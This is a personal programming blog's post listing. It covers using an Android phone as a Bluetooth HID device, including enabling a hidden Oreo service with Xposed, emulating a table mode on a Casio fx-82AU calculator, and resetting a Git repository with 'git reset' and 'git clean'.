	<span class="o">(</span><span class="kt">byte</span><span class="o">)</span> <span class="mh">0xa1</span><span class="o">,</span> <span class="mh">0x01</span><span class="o">,</span> <span class="c1">// COLLECTION (Application)</span>
	<span class="o">(</span><span class="kt">byte</span><span class="o">)</span> <span class="mh">0xa1</span><span class="o">,</span> <span class="mh">0x00</span><span class="o">,</span> <span class="c1">//   COLLECTION (Physical)</span>
	<span class="mh">0x05</span><span class="o">,</span> <span class="mh">0x09</span><span class="o">,</span>        <span class="c1">//     USAGE_PAGE (Button)</span>
	<span class="mh">0x19</span><span class="o">,</span> <span class="mh">0x01</span><span class="o">,</span>        <span class="c1">//     USAGE_MINIMUM (Button 1)</span>
	<span class="mh">0x29</span><span class="o">,</span> <span class="mh">0x04</span><span class="o">,</span>        <span class="c1">//     USAGE_MAXIMUM (Button 4)</span>
	<span class="mh">0x15</span><span class="o">,</span> <span class="mh">0x00</span><span class="o">,</span>        <span class="c1">//     LOGICAL_MINIMUM (0)</span>
	<span class="mh">0x25</span><span class="o">,</span> <span class="mh">0x01</span><span class="o">,</span>        <span class="c1">//     LOGICAL_MAXIMUM (1)</span>
	<span class="mh">0x75</span><span class="o">,</span> <span class="mh">0x01</span><span class="o">,</span>        <span class="c1">//     REPORT_SIZE (1)</span>
	<span class="o">(</span><span class="kt">byte</span><span class="o">)</span> <span class="mh">0x95</span><span class="o">,</span> <span class="mh">0x04</span><span class="o">,</span> <span class="c1">//     REPORT_COUNT (4)</span>
	<span class="o">(</span><span class="kt">byte</span><span class="o">)</span> <span class="mh">0x81</span><span class="o">,</span> <span class="mh">0x02</span><span class="o">,</span> <span class="c1">//     INPUT (Data,Var,Abs)</span>
	<span class="mh">0x75</span><span class="o">,</span> <span class="mh">0x04</span><span class="o">,</span>        <span class="c1">//     REPORT_SIZE (4)</span>
	<span class="o">(</span><span class="kt">byte</span><span class="o">)</span> <span class="mh">0x95</span><span class="o">,</span> <span class="mh">0x01</span><span class="o">,</span> <span class="c1">//     REPORT_COUNT (1)</span>
	<span class="o">(</span><span class="kt">byte</span><span class="o">)</span> <span class="mh">0x81</span><span class="o">,</span> <span class="mh">0x03</span><span class="o">,</span> <span class="c1">//     INPUT (Cnst,Var,Abs)</span>
	<span class="mh">0x05</span><span class="o">,</span> <span class="mh">0x01</span><span class="o">,</span>        <span class="c1">//     USAGE_PAGE (Generic Desktop)</span>
	<span class="mh">0x09</span><span class="o">,</span> <span class="mh">0x30</span><span class="o">,</span>        <span class="c1">//     USAGE (X)</span>
	<span class="mh">0x09</span><span class="o">,</span> <span class="mh">0x31</span><span class="o">,</span>        <span class="c1">//     USAGE (Y)</span>
	<span class="mh">0x15</span><span class="o">,</span> <span class="o">(</span><span class="kt">byte</span><span class="o">)</span> <span class="mh">0x81</span><span class="o">,</span> <span class="c1">//     LOGICAL_MINIMUM (-127)</span>
	<span class="mh">0x25</span><span class="o">,</span> <span class="mh">0x7f</span><span class="o">,</span>        <span class="c1">//     LOGICAL_MAXIMUM (127)</span>
	<span class="mh">0x75</span><span class="o">,</span> <span class="mh">0x08</span><span class="o">,</span>        <span class="c1">//     REPORT_SIZE (8)</span>
	<span class="o">(</span><span class="kt">byte</span><span class="o">)</span> <span class="mh">0x95</span><span class="o">,</span> <span class="mh">0x02</span><span class="o">,</span> <span class="c1">//     REPORT_COUNT (2)</span>
	<span class="o">(</span><span class="kt">byte</span><span class="o">)</span> <span class="mh">0x81</span><span class="o">,</span> <span class="mh">0x02</span><span class="o">,</span> <span class="c1">//     INPUT (Data,Var,Abs)</span>
	<span class="o">(</span><span class="kt">byte</span><span class="o">)</span> <span class="mh">0xc0</span><span class="o">,</span>       <span class="c1">//   END_COLLECTION</span>
	<span class="o">(</span><span class="kt">byte</span><span class="o">)</span> <span class="mh">0xc0</span>        <span class="c1">// END_COLLECTION</span>
<span class="o">};</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<blockquote>
  <p>Since the descriptor describes the format of each report (a update on the inputs), I’ll talk more about what the descriptor specifies in the next post where we communicate with the host.</p>
</blockquote>

<p>This is the final argument of the <code class="language-plaintext highlighter-rouge">BluetoothHidDeviceAppSdpSettings</code> constructor, filling in the <code class="language-plaintext highlighter-rouge">sdp</code> argument of <code class="language-plaintext highlighter-rouge">registerApp()</code>.</p>

<h2 id="a-brief-break"><a href="#a-brief-break">A Brief Break</a></h2>

<p>This leaves one argument left - <code class="language-plaintext highlighter-rouge">callback</code>. This is fortunately relatively straightforward. It turns out that <code class="language-plaintext highlighter-rouge">BluetoothHidDevice.Callback</code> actually has no abstract methods, and the ones handling requests (e.g. <code class="language-plaintext highlighter-rouge">getReport</code>) are not required (from my experience), so <em>technically</em> you can just not do anything. However, it’s helpful to implement <code class="language-plaintext highlighter-rouge">onConnectionStateChanged</code> to be able to know when the connection is ready and when it has ended.</p>

<p>And with this we are able to finally register our app and connect our device:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="nc">BluetoothHidDeviceAppSdpSettings</span> <span class="n">sdp</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BluetoothHidDeviceAppSdpSettings</span><span class="o">(</span>
	<span class="s">"BlueHID"</span><span class="o">,</span>
	<span class="s">"Android HID hackery"</span><span class="o">,</span>
	<span class="s">"Android"</span><span class="o">,</span>
	<span class="o">(</span><span class="kt">byte</span><span class="o">)</span> <span class="mh">0x00</span><span class="o">,</span>
	<span class="n">descriptor</span>
<span class="o">);</span>

<span class="n">mBtHidDevice</span><span class="o">.</span><span class="na">registerApp</span><span class="o">(</span><span class="n">sdp</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="k">new</span> <span class="nc">BluetoothHidDeviceCallback</span><span class="o">()</span> <span class="o">{</span>
	<span class="o">...</span> <span class="c1">// omitted</span>
<span class="o">});</span>

<span class="n">mBtHidDevice</span><span class="o">.</span><span class="na">connect</span><span class="o">(</span><span class="n">device</span><span class="o">);</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This is where I’ll end this post, leaving the actual communication to the next one. There’s not much left, and the hardest part of this entire process (working out the descriptor) is now past us, so the final part of this series shouldn’t be too hard.</p>

<blockquote>
  <p>Final code is available on github at <a href="https://github.com/ralismark/bluehid">ralismark/bluehid</a>.</p>
</blockquote>

<div class="footnotes" role="doc-endnotes">
  <ol>
    <li id="fn:1" role="doc-endnote">
      <p>I’m calling this HID hell for a variety of reasons:</p>

      <ul>
        <li>It took me a while to understand this, so it was “hell” personally for me. For instance, just determining <code class="language-plaintext highlighter-rouge">bDescriptorType</code> took a me few hours.</li>
        <li>The documentation is sometimes unclear.</li>
        <li>It appears that no-one has used BluetoothHidDevice yet.</li>
      </ul>
      <p><a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:2" role="doc-endnote">
      <p>See top of page 49 of the specification. <a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a> <a href="#fnref:2:1" class="reversefootnote" role="doc-backlink">&#8617;<sup>2</sup></a></p>
    </li>
    <li id="fn:3" role="doc-endnote">
      <p><a href="https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf">HID Usage Tables</a>, page 42 <a href="#fnref:3" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
  </ol>
</div>
</div>
  

  <h2 class="fenced-y text-centre bleed"><a href="/posts/bluehid-1">BlueHID Details, part 1 - Oreo Hacks</a></h2>
  
    <div class="bounded"><p>The upcoming Android P adds support for using your phone as a Bluetooth HID, allowing you to potentially use it as a keyboard, mouse, or even a gamepad. However, there hasn’t really been any examples of its use, so I made one. In this series, I’ll break down how I made it work.</p>

<p>However, I don’t have Android P, only Oreo. But there is way to do this on Oreo, which I’ll explain in this entry.</p>

<!--more-->

<blockquote>
  <p>I will be uploading the code to GitHub soon, hopefully in a couple of days - stay tuned for updates.</p>

  <p>EDIT: Code uploaded as <a href="https://github.com/ralismark/bluehid">https://github.com/ralismark/bluehid</a></p>
</blockquote>

<p>Despite the interest around the addition <a href="https://developer.android.com/reference/android/bluetooth/BluetoothHidDevice">BluetoothHidDevice</a>, there doesn’t seem too much interest on actually using it <sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote">1</a></sup> and implementing a device - probably a combination of P still being in developer preview and the actual API being a bit daunting (we’ll get up to that later).</p>

<p>There has been interest before on using an android phone as a Bluetooth HID device <sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote">2</a></sup>, and there are <a href="https://github.com/kshoji/BLE-HID-Peripheral-for-Android">successful implementations using BLE</a>. However, that approach requires the BLE peripheral feature, which many phones (including mine, a OnePlus X) do not support. After some digging, I found that this was already implemented (but disabled and under a different name) in android O - see <a href="https://android-review.googlesource.com/c/platform/packages/apps/Bluetooth/+/203832">this PR</a>.</p>

<p>All I need to be able to use this is to enable it, and is quite easy with Xposed. Firstly, you need to set the <a href="https://android.googlesource.com/platform/packages/apps/Bluetooth/+/oreo-release/res/values/config.xml#33">flag to enable</a> it.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="nd">@Override</span>
<span class="kd">public</span> <span class="kt">void</span> <span class="nf">handleInitPackageResources</span><span class="o">(</span><span class="nc">InitPackageResourcesParam</span> <span class="n">resparam</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Throwable</span> <span class="o">{</span>
	<span class="k">if</span> <span class="o">(!</span><span class="n">resparam</span><span class="o">.</span><span class="na">packageName</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"com.android.bluetooth"</span><span class="o">))</span> <span class="o">{</span>
		<span class="k">return</span><span class="o">;</span>
	<span class="o">}</span>

	<span class="n">resparam</span><span class="o">.</span><span class="na">res</span><span class="o">.</span><span class="na">setReplacement</span><span class="o">(</span><span class="s">"com.android.bluetooth"</span><span class="o">,</span>
		<span class="s">"bool"</span><span class="o">,</span> <span class="s">"profile_supported_hidd"</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
<span class="o">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>However, due to <a href="https://android.googlesource.com/platform/packages/apps/Bluetooth/+/oreo-release/AndroidManifest.xml#384">this in AndroidManifest.xml</a>, and the fact that the manifest only matters when installing the app, you also need to enable to service. This can be done through the package manager API:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre><span class="nd">@Override</span>
<span class="kd">public</span> <span class="kt">void</span> <span class="nf">handleLoadPackage</span><span class="o">(</span><span class="n">XC_LoadPackage</span><span class="o">.</span><span class="na">LoadPackageParam</span> <span class="n">lpparam</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Throwable</span> <span class="o">{</span>
	<span class="k">if</span> <span class="o">(!</span><span class="n">lpparam</span><span class="o">.</span><span class="na">packageName</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"com.android.bluetooth"</span><span class="o">))</span> <span class="o">{</span>
		<span class="k">return</span><span class="o">;</span>
	<span class="o">}</span>

	<span class="nc">Class</span><span class="o">&lt;?&gt;</span> <span class="n">adapterApp</span> <span class="o">=</span> <span class="nc">XposedHelpers</span><span class="o">.</span><span class="na">findClass</span><span class="o">(</span>
		<span class="s">"com.android.bluetooth.btservice.AdapterApp"</span><span class="o">,</span> <span class="n">lpparam</span><span class="o">.</span><span class="na">classLoader</span><span class="o">);</span>

	<span class="nc">XposedBridge</span><span class="o">.</span><span class="na">hookAllMethods</span><span class="o">(</span><span class="n">adapterApp</span><span class="o">,</span> <span class="s">"onCreate"</span><span class="o">,</span> <span class="k">new</span> <span class="n">XC_MethodHook</span><span class="o">()</span> <span class="o">{</span>
		<span class="nd">@Override</span>
		<span class="kd">protected</span> <span class="kt">void</span> <span class="nf">afterHookedMethod</span><span class="o">(</span><span class="nc">MethodHookParam</span> <span class="n">param</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Throwable</span> <span class="o">{</span>
		<span class="nc">Application</span> <span class="n">app</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Application</span><span class="o">)</span> <span class="n">param</span><span class="o">.</span><span class="na">thisObject</span><span class="o">;</span>

		<span class="nc">PackageManager</span> <span class="n">pm</span> <span class="o">=</span> <span class="n">app</span><span class="o">.</span><span class="na">getPackageManager</span><span class="o">();</span>

		<span class="nc">ComponentName</span> <span class="n">hidServiceName</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ComponentName</span><span class="o">(</span>
			<span class="s">"com.android.bluetooth"</span><span class="o">,</span> <span class="s">"com.android.bluetooth.hid.HidDevService"</span><span class="o">);</span>
		<span class="n">pm</span><span class="o">.</span><span class="na">setComponentEnabledSetting</span><span class="o">(</span><span class="n">hidServiceName</span><span class="o">,</span>
			<span class="nc">PackageManager</span><span class="o">.</span><span class="na">COMPONENT_ENABLED_STATE_ENABLED</span><span class="o">,</span> <span class="nc">PackageManager</span><span class="o">.</span><span class="na">DONT_KILL_APP</span><span class="o">);</span>
		<span class="o">}</span>
	<span class="o">});</span>
<span class="o">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>After this, the Bluetooth HID service is available, and the API can be used (though with some name changes e.g. <code class="language-plaintext highlighter-rouge">BluetoothHidDevice</code> → <code class="language-plaintext highlighter-rouge">BluetoothInputHost</code>) after <a href="https://github.com/anggrayudi/android-hidden-api">making internal/hidden API available</a>.</p>

<p>In the next part of this, I’ll start on the actual implementation of BlueHID.</p>
<div class="footnotes" role="doc-endnotes">
  <ol>
    <li id="fn:1" role="doc-endnote">
      <p><a href="https://stackoverflow.com/q/53555092">How can i use the Bluetooth HID Device profile in Android Pie?</a>, with no answers (as of the writing of this). <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:2" role="doc-endnote">
      <p><a href="https://stackoverflow.com/q/29406726">Implementation of Bluetooth HID device profile in Android Kitkat</a> and <a href="https://stackoverflow.com/q/49189504">Android as a bluetooth HID keyboard and mouse</a>, for instance. <a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
  </ol>
</div>
</div>
  

  <h2 class="fenced-y text-centre bleed"><a href="/posts/table-mode">Emulating table mode on Casio fx-82AU (and variants)</a></h2>
  
    <div class="bounded"><p>Table mode is a mode available on my old calculator which essentially produced a table of values. This mode is not present on board-approved calculators (like the fx-82AU and similar variants), but I have found a way to essentially produce something similar to it, making obtaining a sequence of numbers much easier.</p>

<!--more-->

<p>Before actually getting to table mode, I’ll explain 2 features required for this: variables, and the colon. If you already understand one or both of these, skip to the relevant sections.</p>

<h2 id="variables"><a href="#variables">Variables</a></h2>

<p>The fx-82AU has 9 variables: A to F, X, Y, and M. All of these can store a number, which is kept between expressions and even restarts. Typically, these can be either used for numeric constants (often in the sciences e.g. storing the charge of an electron, or the ideal gas constant), or for intermediate steps of a longer calculation. Using a variable is as simple as entering it with <kbd>Alpha</kbd> and the corresponding key. Storing a variable is done using <kbd>STO</kbd> (i.e. <kbd>Shift</kbd> <kbd>RCL</kbd>), followed by the button labelled with the variable (but without Alpha). For example, X is set using <kbd>Shift</kbd> <kbd>RCL</kbd> <kbd>)</kbd>.</p>

<p>The way variable setting seems to work is by adding the → symbol followed by the variable, then evaluating it (pressing <kbd>=</kbd>). Ans is inserted before this if required. This allows the variable to be set again if the expression is re-entered through history and evaluated. The fact that it works through appending symbols is important for table mode, though variables are still very useful in normal use.</p>

<h2 id="the-colon"><a href="#the-colon">The Colon</a></h2>

<p>The colon (entered through <kbd>Alpha</kbd> <kbd>x³</kbd>) is probably one of the least used symbols. What this does, is it evaluates each sub-expression separated by the colon in sequence, advancing when <kbd>=</kbd> is pressed and starting from the beginning after reaching the end. For example, continually pressing <kbd>=</kbd> after entering Ans+1:Ans+2, when Ans was 0, produces 1, 3, 4, 6, 7, 9, etc. Multiple sub-expressions can be used, such as <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>:</mo><mn>2</mn><mo>:</mo><mn>3</mn><mo>:</mo><mn>4</mn><mo>:</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">1:2:3:4:5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span></span></span></span>. Notably, each expression is re-evaluated each time instead of recalling from history, allowing more interesting things to be done.</p>

<h2 id="table-mode"><a href="#table-mode">Table mode</a></h2>

<p>Firstly, set X to 0. Then, enter the expression you want in terms of X (say <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>X</mi><mn>2</mn></msup><mo>+</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">X^2+3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span></span></span></span>), then the colon, then X+1. After this, the input should be <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>X</mi><mn>2</mn></msup><mo>+</mo><mn>3</mn><mo>:</mo><mi>X</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">X^2+3:X+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>. Then, enter the button sequence required to save to X. This will produce the value of the expression at X=0. Repeatedly pressing equals alternates between showing the updated value of X, and the value of the expression there.</p>

<p>How this works is a combination of the colon (which has the lowest precedence) and the →X symbols produced when saving a variable. As such, repeatedly pressing <kbd>=</kbd> alternates between evaluating <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>X</mi><mn>2</mn></msup><mo>+</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">X^2+3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span></span></span></span> (producing the value at X) and <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>+</mo><mn>1</mn><mo>&#x2192;</mo><mi>X</mi></mrow><annotation encoding="application/x-tex">X+1 \rightarrow X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&#x2192;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span> (incrementing X). This is effectively a for-loop.</p>

<p>This technique can be expanded to evaluate multiple expressions (e.g. ones with plus or minus). To do this, enter the expressions, separated by colons, instead of the single expression entered above. For example, <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn><mi>X</mi><mo>+</mo><mn>1</mn><mo>:</mo><mn>4</mn><mi>X</mi><mo>&#x2212;</mo><mn>1</mn><mo>:</mo><mi>X</mi><mo>+</mo><mn>1</mn><mo>&#x2192;</mo><mi>X</mi></mrow><annotation encoding="application/x-tex">4X+1:4X-1:X+1&#x2192;X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord">4</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord">4</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">&#x2212;</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&#x2192;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span>. The first and the second expression are evaluated in each iteration of the loop. The initial value can be changed by having a different X prior to starting the loop. Different steps for X can be used by changing the +1 in the final sub-expression (e.g. to <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>&#x2212;</mo><mn>1</mn><mo>&#x2192;</mo><mi>X</mi></mrow><annotation encoding="application/x-tex">X-1&#x2192;X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">&#x2212;</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&#x2192;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span>).</p>

<h2 id="conclusion"><a href="#conclusion">Conclusion</a></h2>

<p>Congratulations, you have turned a non-programmable calculator into a programmable calculator!</p>

<p>There are probably other applications of this technique, but I can’t think of anything too different right now. Anyways, remember that knowing how to use your calculator will benefit you greatly.</p>
</div>
  

  <h2 class="fenced-y text-centre bleed"><a href="/posts/git-ep-cleanup">Git Emergency Procedures - Cleaning things up</a></h2>
  
    <div class="bounded"><p>When working on a repo, you may want to reset the repository to the initial
state when you cloned it. This is more involved than you may think.</p>

<!--more-->

<p>While this isn’t exactly an emergency, it’s still something useful to know. I’ve
often cloned a large project, made modifications, then had to undo all of them.
Compiled products, generated files and other mess would also need to be removed,
but it’s very difficult to find when hidden by <code class="language-plaintext highlighter-rouge">.gitignore</code>.</p>

<p>For this, I’m assuming you want to reset absolutely everything you’ve done. If
you want to save things, copy them outside the repo before wiping everything.</p>

<h2 id="tracked-files"><a href="#tracked-files">Tracked files</a></h2>

<p>Reverting all tracked files is pretty simple:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>git reset --hard HEAD
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This resets the working tree (file system contents) and the index (staged files)
to the current commit, clearing all changes.</p>

<p>However, this misses both files ignore by <code class="language-plaintext highlighter-rouge">.gitignore</code> and those that are just
plain untracked. These are usually more common than modified files, especially
when you’re just building a project.</p>

<h2 id="actually-cleaning"><a href="#actually-cleaning">Actually cleaning</a></h2>

<p>Fortunately, there exists a command to do just this - <a href="https://git-scm.com/docs/git-clean"><code class="language-plaintext highlighter-rouge">git clean</code></a>! As its
man page helpfully states:</p>

<blockquote>
  <p>Cleans the working tree by recursively removing files that are not under version
control, starting from the current directory.</p>
</blockquote>

<p>This command allows us to wipe everything else from the repo. However, if you
run <code class="language-plaintext highlighter-rouge">git clean</code> without any options, you’ll see that it misses a lot of stuff.
To truly remove everything, you need this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>git clean -x -d -f -f
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This has three flags, which can be combined into <code class="language-plaintext highlighter-rouge">-xdff</code>:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">-x</code>: Ignore the <code class="language-plaintext highlighter-rouge">.gitignore</code>, deleting all untracked files</li>
  <li><code class="language-plaintext highlighter-rouge">-d</code>: Delete directories as well as files</li>
  <li><code class="language-plaintext highlighter-rouge">-ff</code>: (yes, two <sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote">1</a></sup> f’s here) Delete even sub-repositories</li>
</ul>

<p>Running this command will dutifully, irrevocably delete all untracked files
under the current directory. Make sure you’re in the repo root to clean
everything. If you want to see what you’re doing, replace the <code class="language-plaintext highlighter-rouge">-f</code>s with a
single <code class="language-plaintext highlighter-rouge">-n</code> to show what would’ve been deleted. For more useful options it’s
best to see the <a href="https://git-scm.com/docs/git-clean">man page</a>.</p>

<p>However, you still need to run <code class="language-plaintext highlighter-rouge">git reset --hard HEAD</code> to reset modified files,
as <code class="language-plaintext highlighter-rouge">git clean</code> only works on files not under version control.</p>

<h2 id="not-everything"><a href="#not-everything">Not everything</a></h2>

<p>The above covers most destructive use cases, but once in a while you’ll need to
save a few things from complete destruction.</p>

